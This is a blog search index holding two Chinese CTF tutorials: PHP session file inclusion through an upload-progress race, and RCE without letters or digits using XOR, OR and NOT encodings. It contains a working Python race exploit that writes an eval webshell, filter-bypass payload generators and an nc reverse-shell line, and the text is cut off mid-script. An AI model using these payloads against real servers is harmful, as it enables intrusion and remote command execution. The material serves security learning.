<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>session文件包含</title>
    <link href="/2023/09/15/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2023/09/15/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h1><p>参考文章：<a href="https://www.anquanke.com/post/id/201177#h2-1">https://www.anquanke.com/post/id/201177#h2-1</a></p><p>通过session包含的利用条件：<br>1.session文件路径已知</p><p>可以通过phpinfo()查看里面的sesion.save_path来获取</p><p>2.其中部分内容可控</p><p>下面来简单演示这个session文件包含</p><p>session.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>]=<span class="hljs-variable">$username</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>php中session默认是以文件形式进行储存的，文件名是sess_PHPSESSID 这个PHPSESSID是可以知道的，如果我们知道了session的储存位置，可以从phpinfo()中看到相关信息</p><p>并且里面的内容是我们可以控制的，我们就可以利用文件包含达到我们想要的。</p><p><img src="https://s2.loli.net/2023/09/15/tkfF3lU5YRdsXLh.png" alt="image-20230718172140755.png"></p><p><img src="https://s2.loli.net/2023/09/15/QPbLkUKo29fSYDG.png" alt="image-20230718172230624.png"></p><p><img src="https://s2.loli.net/2023/09/15/SbYqGraEfyHnp94.png" alt="image-20230718172351972.png"></p><p>上面的是session储存路径</p><p>以上只是最简单的进行一个利用，通常情况下，会对用户的会话信息进行一个编码，或者说没有session_start() 这样的情况下上面的情况就不能执行成功，所以我们就需要想办法进行绕过。</p><h1 id="下面是几种情况的绕过："><a href="#下面是几种情况的绕过：" class="headerlink" title="下面是几种情况的绕过："></a>下面是几种情况的绕过：</h1><h2 id="1-session经过base64编码"><a href="#1-session经过base64编码" class="headerlink" title="1.session经过base64编码"></a>1.session经过base64编码</h2><p>这种情况下一般想到的是对session解码就可以了，利用那个php伪协议，但是吧，由于base64的编码规则，我们并不能直接利用这个php伪协议，需要构造长度，让php伪协议去解码的时候，不影响后面的。</p><p>session.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>]=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/09/15/rMeGND46xv2EfkB.png" alt="image-20230718183919467.png"></p><p>下面来讲一下这个base64的编码规则：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.将传入的字符转换成<span class="hljs-number">2</span>进制 根据ascii进行划分 是<span class="hljs-number">8</span>位 （不满<span class="hljs-number">8</span>个高位补零）<br><span class="hljs-attribute">2</span>.将<span class="hljs-number">8</span>位的二进制进行<span class="hljs-number">6</span>位一组划分，因为<span class="hljs-number">2</span>^<span class="hljs-number">6</span>=<span class="hljs-number">64</span>  不满<span class="hljs-number">6</span>位的补零<br><span class="hljs-attribute">3</span>.总的比特数得是<span class="hljs-number">24</span>的倍数，<span class="hljs-number">6</span>和<span class="hljs-number">8</span>的最小公倍数是<span class="hljs-number">24</span> 不满足的补零，补的零转换成=<br><span class="hljs-attribute">4</span>.最后根据表格转换成字符串<br></code></pre></td></tr></table></figure><p><img src="https://p3.ssl.qhimg.com/t0178a983065875c97e.png" alt="img"></p><p><img src="https://p1.ssl.qhimg.com/t01eec8c9eb8ff18e75.png" alt="img"></p><p>经过base64编码过后的长度是原长度的4/3</p><p>编码了解了，下面看一下解码，解码和编码差不多，编码后的长度是原长度的3/4</p><p>所以是4个字节一组 这样才满足解码规则，之前的是只对session进行了编码，然后对所有的内容进行了解码，这样是错误的，所以我们根据解码的规则，构造长度，让前面的能够满足4位一组，让后面的session能够进行一个解码</p><p>username|s:24:” 我们这里使用的是php解释器，具体的请看session反序列化  由于base64解码只会对 A-Z，a-z,0-9 和/ + = 进行一个解码，其他的字符不会进行解码</p><p>所以上面的实际就是user name s24  共11个字符，还差一个，这时就在session传入那里构造其他的垃圾数据</p><p>让其满足username|s”xxx:”  就是3位数据</p><p><img src="https://s2.loli.net/2023/09/15/tRebZyTG78YQXPq.png" alt="image-20230718185352817.png"> </p><p><img src="https://s2.loli.net/2023/09/15/vR19d7kwZpMNyxT.png" alt="image-20230718185411245.png"></p><h2 id="2-No-session-start"><a href="#2-No-session-start" class="headerlink" title="2.No session_start()"></a>2.No session_start()</h2><p>首先要理解几个session中的配置是什么意思</p><p><img src="https://p2.ssl.qhimg.com/t018bf95c18fe0d3587.png" alt="img"></p><p>session.auto_start 这个键开启时，会自动进行session的初始化，但是一般情况下是默认关闭的。</p><p>session.upload_progress.cleanup 这个开启的时候表示当上传完成后php会立刻清理session文件的内容，这个跟后面的条件竞争有关</p><p>session.upload_progress_enabled 这个开启的时候，php能够在每一个文件上传时，检测其进度。只有这一个的话并没有什么，但是，同时POST一个跟ini中session.upload_progress_name相同名字的变量时，就会将进度信息保存在session中，这一部分数据是可以控制的，session就会自动进行初始化，索引是session.upload_progress.prefix和session.upload_prgress.name连接在一起的值</p><p><code>session.upload_progress.freq = &quot;1%&quot;</code>+<code>session.upload_progress.min_freq = &quot;1&quot;</code>：选项控制了上传进度信息应该多久被重新计算一次。 通过合理设置这两个选项的值，这个功能的开销几乎可以忽略不计。</p><p>session.use_strict_mode为0时，它的PHPSESSID的值是由我们自己定义的</p><p>综上所述，整体的一个思想就是session.uplaod_progress.name的值是可以控制的，同时POST传递时，会将其保存在session中，并且PHPSESSID的值是我们可以控制的，这样我们就可以恶意构造session.uplaod_progress.name的值，通过文件包含和条件竞争，来实现一个危害。</p><p>实现方法总共有两种，一种就是通过脚本跑，另一种就是通过bp</p><p>先来说通过bp的。</p><p>1，首先要构造一个上传表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!doctype <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://node4.anna.nssctf.cn:28342/index.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">vaule</span>=<span class="hljs-string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file1&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file2&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上面的内容根据实际情况进行修改</p><p>2.修改PHPSESSID的值，发送到爆破板块</p><p><img src="https://s2.loli.net/2023/09/15/pjdLToiImzPtJ2c.png" alt="image-20230719113426206.png"></p><p>3.设置NULL payloads</p><p>4.将文件包含的也发送到bp爆破模块</p><p><img src="https://s2.loli.net/2023/09/15/jNzfqTe3o7UvO6l.png" alt="image-20230719113547926.png"></p><p>也设置NULL payloads 然后就可以去连接蚁剑了</p><p>方法2.通过脚本：<br>网上找的一个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-keyword">import</span> requests<br><br>sessid = <span class="hljs-string">&#x27;0&#x27;</span><br>target = <span class="hljs-string">&#x27;http://node4.anna.nssctf.cn:28071/&#x27;</span><br>file = <span class="hljs-string">&#x27;ph0ebus.txt&#x27;</span><br>f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br><br>event = threading.Event()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> event.is_set():  <span class="hljs-comment"># 使用 event.is_set() 来判断是否需要继续执行</span><br>        session.post(target, data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,<br>                     files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (file, f)&#125;, cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)  <span class="hljs-comment"># 修改参数名为 cookies</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> event.is_set():  <span class="hljs-comment"># 使用 event.is_set() 来判断是否需要继续执行</span><br>        resp = session.get(<br>            <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;target&#125;</span>?mode=foo&amp;file=/tmp/sess_<span class="hljs-subst">&#123;sessid&#125;</span>&amp;cmd=system(&#x27;cd /;ls;cat nssctf*&#x27;);&quot;</span>)  <span class="hljs-comment"># 修改为 get 请求</span><br>        <span class="hljs-keyword">if</span> file <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            event.<span class="hljs-built_in">set</span>()  <span class="hljs-comment"># 如果成功读取到文件内容，设置 event，退出循环</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]retry&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    threads = []  <span class="hljs-comment"># 存储线程的列表</span><br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            t1 = threading.Thread(target=write, args=(session,))<br>            threads.append(t1)<br>            t1.start()<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            t2 = threading.Thread(target=read, args=(session,))<br>            threads.append(t2)<br>            t2.start()<br><br>        <span class="hljs-comment"># 等待所有线程结束</span><br>        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>            t.join()<br><br>    event.<span class="hljs-built_in">set</span>()  <span class="hljs-comment"># 设置 event，以防止线程无法退出循环</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无数字字母RCE</title>
    <link href="/2023/08/25/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/"/>
    <url>/2023/08/25/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/</url>
    
    <content type="html"><![CDATA[<h1 id="无数字字母RCE"><a href="#无数字字母RCE" class="headerlink" title="无数字字母RCE"></a>无数字字母RCE</h1><h2 id="异或"><a href="#异或" class="headerlink" title="异或 ^"></a>异或 ^</h2><p>异或运算：相同为0 不同为1</p><p>两个字符的ascii码所对应的二进制进行一个异或运算</p><p>然后思想就是将两个字符串进行一个异或运算 结果就是我们想要得到的一个值</p><p>下面是一个php的异或运算的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$shell</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>];<br><span class="hljs-variable">$result1</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$result2</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">judge</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="hljs-variable">$c</span>))<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$num</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$num</span>&lt;=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$shell</span>);<span class="hljs-variable">$num</span>++)<br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$x</span>=<span class="hljs-number">33</span>;<span class="hljs-variable">$x</span>&lt;=<span class="hljs-number">126</span>;<span class="hljs-variable">$x</span>++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">judge</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$x</span>)))<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-variable">$y</span>=<span class="hljs-number">33</span>;<span class="hljs-variable">$y</span>&lt;=<span class="hljs-number">126</span>;<span class="hljs-variable">$y</span>++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">judge</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$y</span>)))<br>                &#123;<br>                    <span class="hljs-variable">$f</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$x</span>)^<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$y</span>);<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f</span> == <span class="hljs-variable">$shell</span>[<span class="hljs-variable">$num</span>])<br>                    &#123;<br>                        <span class="hljs-variable">$result1</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$x</span>);<br>                        <span class="hljs-variable">$result2</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$y</span>);<br>                        <span class="hljs-keyword">break</span> <span class="hljs-number">2</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;异或运算第一部分： &quot;</span>.<span class="hljs-variable">$result1</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;异或运算第二部分： &quot;</span>.<span class="hljs-variable">$result2</span>;<br>异或运算第一部分：<br>异或运算第二部分：<br></code></pre></td></tr></table></figure><p>还有一个python的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">valid = <span class="hljs-string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span><br>answer = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入进行异或构造的字符串：&quot;</span>))<br>tmp1, tmp2 = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> answer:<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> valid:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> valid:<br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ord</span>(i) ^ <span class="hljs-built_in">ord</span>(j) == <span class="hljs-built_in">ord</span>(c)):<br>        tmp1 += i<br>        tmp2 += j<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>      <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tmp1为:&quot;</span>,tmp1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tmp2为:&quot;</span>,tmp2)<br></code></pre></td></tr></table></figure><p>输入我们想要执行的就可以了</p><p>我们来看一下：</p><p><img src="https://s2.loli.net/2023/08/25/ejPVdK1hATQyo7C.png" alt="image-20230706202523452.png"></p><p><img src="https://s2.loli.net/2023/08/25/me9wrOgdAEplF42.png" alt="image-20230706203038189.png"></p><p>“运算第一部分”^”运算第二部分”  这里要进行一个url编码 因为加号会被当作空格 所以要进行一个url编码</p><p><strong>php5</strong>下可以用<code>assert($_POST[&#39;_&#39;]);</code> 进行一个命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">  <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;_&#x27;</span>]);    <br><span class="hljs-variable">$a</span>=assert;<br><span class="hljs-variable">$b</span>=_POST;<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$$b</span>;<br><span class="hljs-variable">$a</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">&#x27;_&#x27;</span>]);    <span class="hljs-comment">//让a=_   让b=__ 让c=___    //因为是无数字字母</span><br>    <span class="hljs-meta">?&gt;</span>     <span class="hljs-comment">// assert=&quot;!((%)(&quot;^&quot;@[[@[\\&quot;   _POST=&quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;   最后要对结果进行一个url编码</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/25/FCjqc2XBkuMzaVv.png" alt="image-20230706211442786.png"></p><p>记得url编码</p><p>PHP7下面构造一个反引号</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">`<span class="hljs-symbol">$</span>_POST[_]`     <span class="hljs-symbol">$</span>_=<span class="hljs-string">&quot;!+/((&quot;</span>^<span class="hljs-string">&quot;~&#123;`&#123;|&quot;</span>;<span class="hljs-symbol">$</span>__=<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_;`<span class="hljs-symbol">$</span>__[_]`;<br></code></pre></td></tr></table></figure><p>然后这个利用到了反弹shell _=nc ip 监听端口号 -e /bin/bash</p><h2 id="或"><a href="#或" class="headerlink" title="或  |"></a>或  |</h2><p>有1则为1 下面是脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php">import re<br>import urllib<br><span class="hljs-keyword">from</span> urllib import parse<br>hex_i = <span class="hljs-string">&quot;&quot;</span><br>hex_j = <span class="hljs-string">&quot;&quot;</span><br>pattern=<span class="hljs-string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>    <span class="hljs-comment">//这个地方是根据题目进行一个正则匹配</span><br>str1=[<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;cat flag.php&quot;</span>]    <span class="hljs-comment">//进行命令执行的</span><br><span class="hljs-keyword">for</span> p in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">2</span>):<br>    t1 = <span class="hljs-string">&quot;&quot;</span><br>    t2 = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> k in str1[p]:<br>        <span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">256</span>):<br>            <span class="hljs-keyword">for</span> j in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">256</span>):<br>                <span class="hljs-keyword">if</span> re.<span class="hljs-title function_ invoke__">search</span>(pattern,<span class="hljs-title function_ invoke__">chr</span>(i)) :<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> re.<span class="hljs-title function_ invoke__">search</span>(pattern,<span class="hljs-title function_ invoke__">chr</span>(j)) :<br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">16</span>:<br>                    hex_i = <span class="hljs-string">&quot;0&quot;</span> + <span class="hljs-title function_ invoke__">hex</span>(i)[<span class="hljs-number">2</span>:]<br>                <span class="hljs-keyword">else</span>:<br>                    hex_i=<span class="hljs-title function_ invoke__">hex</span>(i)[<span class="hljs-number">2</span>:]<br>                <span class="hljs-keyword">if</span> j &lt; <span class="hljs-number">16</span>:<br>                    hex_j=<span class="hljs-string">&quot;0&quot;</span>+<span class="hljs-title function_ invoke__">hex</span>(j)[<span class="hljs-number">2</span>:]<br>                <span class="hljs-keyword">else</span>:<br>                    hex_j=<span class="hljs-title function_ invoke__">hex</span>(j)[<span class="hljs-number">2</span>:]<br>                hex_i=<span class="hljs-string">&#x27;%&#x27;</span>+hex_i<br>                hex_j=<span class="hljs-string">&#x27;%&#x27;</span>+hex_j<br>                c=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(urllib.parse.<span class="hljs-title function_ invoke__">unquote</span>(hex_i))|<span class="hljs-title function_ invoke__">ord</span>(urllib.parse.<span class="hljs-title function_ invoke__">unquote</span>(hex_j)))<br>                <span class="hljs-keyword">if</span>(c ==k):<br>                    t1=t1+hex_i<br>                    t2=t2+hex_j<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;(\&quot;&quot;</span>+t1+<span class="hljs-string">&quot;\&quot;|\&quot;&quot;</span>+t2+<span class="hljs-string">&quot;\&quot;)&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><p>~() 会对括号里面的东西进行一个取反  如果原本是0b1001  经过取反后是 0b0110</p><p><img src="https://s2.loli.net/2023/08/25/hNUTOxH4enmrPLQ.png" alt="image-20230706221417162.png"></p><p>有中文的也有url编码的  </p><p>下面用url的来讲一下：</p><p><img src="https://s2.loli.net/2023/08/25/6egkZrpwcUoJICP.png" alt="image-20230706222401719.png"></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$_=assert $__=_POST      不用在再url了   这个是在php5下<br></code></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;_POST&quot;</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span 